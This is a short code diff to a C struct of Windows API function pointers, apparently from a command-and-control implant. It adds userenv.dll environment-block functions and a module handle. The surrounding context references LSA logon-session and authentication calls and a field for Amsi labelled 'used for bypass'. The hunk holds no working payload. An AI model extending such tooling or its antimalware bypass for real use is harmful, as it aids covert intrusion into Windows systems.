@@ -400,6 +400,10 @@ typedef struct
         WIN_FUNC( getaddrinfo )
         WIN_FUNC( freeaddrinfo )
 
+        /* userenv.dll — declared explicitly because userenv.h may not be in toolchain */
+        BOOL ( WINAPI *CreateEnvironmentBlock  ) ( LPVOID *lpEnvironment, HANDLE hToken, BOOL bInherit );
+        BOOL ( WINAPI *DestroyEnvironmentBlock ) ( LPVOID lpEnvironment );
+
         /* sspicli.dll */
         WIN_FUNC( LsaCallAuthenticationPackage )
         WIN_FUNC( LsaGetLogonSessionData )
@@ -512,6 +516,7 @@ typedef struct
         PVOID NetApi32;
         PVOID Ws2_32;
         PVOID Sspicli;
+        PVOID Userenv;
 
         /* used for bypass */
         PVOID Amsi;
